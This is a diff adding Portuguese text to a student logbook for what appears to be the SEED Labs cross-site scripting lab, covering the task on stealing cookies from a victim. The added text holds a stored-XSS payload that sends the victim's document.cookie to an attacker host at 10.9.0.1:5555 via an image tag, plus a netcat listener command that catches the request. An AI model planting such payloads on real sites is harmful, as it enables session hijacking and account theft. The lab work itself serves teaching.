@@ -49,7 +49,19 @@ Tal como era esperado, sempre que um utilizador visita o perfil de `Samy` (neste
 
 ## Task 3: Stealing Cookies from the Victim’s Machine
 
+Na `task 2` apenas o utilizador visualizava as suas _cookies_. Para o atacante ter acesso às mesmas é necessário modificar o código JavaScript, como é sugerido no guião, para o seguinte:
+
+```html
+<script>document.write('<img src=http://10.9.0.1:5555?c='
+                       + escape(document.cookie) + '   >');
+</script>
+```
+
+- Nota: A explicação do código acima foi omitida, uma vez que, a mesma já se encontra no guião.
+
 ![](./screenshots/logbook10_task3.png) 
+
+De modo a ficar à escuta na porta 5555 e imprimir o pedido HTTP GET com as _cookies_, utilizou-se o comando `nc -lknv 5555`, cujo _output_ foi o seguinte:
 
 ```sh
 [12/09/22]seed@VM:~/.../Labsetup$ nc -lknv 5555
@@ -64,6 +76,8 @@ Accept-Encoding: gzip, deflate
 Connection: keep-alive
 Referer: http://www.seed-server.com/profile/samy
 ```
+
+É possível verificar que as _cookies_ recebidas na máquina do atacante coincidem com as que foram impressas na `task 2`.
 
 ## Task 4: Becoming the Victim’s Friend
 
